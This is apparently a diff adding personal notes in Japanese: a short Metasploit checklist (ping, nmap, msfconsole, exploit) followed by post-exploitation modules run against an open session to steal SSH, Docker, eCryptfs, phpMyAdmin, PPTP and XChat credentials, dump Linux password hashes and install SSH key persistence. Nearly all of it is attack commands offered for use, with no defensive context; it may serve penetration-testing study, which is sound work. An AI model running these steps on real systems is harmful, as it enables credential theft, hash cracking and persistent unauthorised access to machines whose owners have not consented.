@@ -1,0 +1,54 @@
+1) ping
+2) nmap
+3) msfconsole
+4) use 
+5) set
+6) checl
+7) exploit -z
+8) モジュール
+① SSHの認証情報
+use post/multi/gather/ssh_creds
+set SESSION 1
+run
+
+② Docker認証情報
+use post/multi/gather/docker_creds
+set SESSION 1
+run
+
+③　hashdump
+use post/linux/gather/hashdump
+set SESSION 1
+set VERBOSE true
+run
+
+④ eCryptfs
+use post/linux/gather/ecryptfs_creds
+set SESSION 1
+run
+
+⑤ PSK列挙
+use post/linux/gather/enum_psk
+set SESSION 1
+run
+ 
+⑥ XCHAT
+use post/linux/gather/enum_xchat
+set SESSION 1
+set XCHAT true
+run
+
+⑦ phpmyadmin
+use post/linux/gather/phpmyadmin_credsteal
+set SESSION 1
+run
+
+⑧ pptp vpn
+use post/linux/gather/pptpd_chap_secrets
+set SESSION 1
+run
+
+⑨ ssh永続化
+use post/linux/manage/sshkey_persistence
+set SESSION 1
+run
